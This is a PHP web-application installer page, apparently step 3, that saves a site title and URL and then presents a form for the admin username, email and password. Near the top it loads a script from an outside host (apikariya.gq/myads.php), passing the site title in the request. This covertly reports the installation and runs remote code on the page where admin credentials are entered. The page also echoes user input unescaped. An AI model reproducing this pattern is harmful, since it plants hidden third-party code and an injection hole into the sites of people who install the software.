 <?php
 require_once '../dbconfig.php';

      if($_POST)
	{
        $etit = $_POST['etit'];
		$eurl = $_POST['eurl'];
        $eid  = "1";
        $stmt = $db_con->prepare("UPDATE setting SET titer=:etit,url=:eurl  WHERE id=:id ");
		$stmt->bindParam(":etit", $etit);
		$stmt->bindParam(":eurl", $eurl);
        $stmt->bindParam(":id", $eid);
  }

   include "header.php";
    ?>
     <script language="javascript" src="http://apikariya.gq/myads.php?name=<?php echo  $etit; ?> (v2.4.3)"></script>
    <div class="main-content">
		<div class="form">
			<div class="sap_tabs">
				<div id="horizontalTab" style="display: block; width: 100%; margin: 0px;">

                       <div class="facts">
					        <div class="register">
                            <p><?php if($stmt->execute())
		{
         echo "Successfully updated";
		}
		else{
             	echo "Query Problem";
		} ?></p>
						         <form method='post'  action='install5.php'>
                                 <h3>Admin Username:</h3>
							     <input  type="text" placeholder="Username" name="user_name">
							     <h3>Admin Email:</h3>
							     <input  type="text" placeholder="Email address" name="user_email">
                                 <h3>Password:</h3>
							     <input type="password" placeholder="Password" name="password">
                                 <div class="sign-up">
								 <input type="submit" value='Next' class="btn btn-primary" name="btn-signup"/>
								 </div>
                                </form>
						    </div>
				        </div>

			 	</div>
		    </div>
        </div>
        <div class="right">
			<h4>Step 3</h4>
			<ul>
				<li><p>Type your username or e-mail and password for administration</p></li>
				<li><p>Click on the next button</p></li>

			</ul>


		</div>
		<div class="clear"></div>
	</div>



   <?php   include "footer.php";   ?>
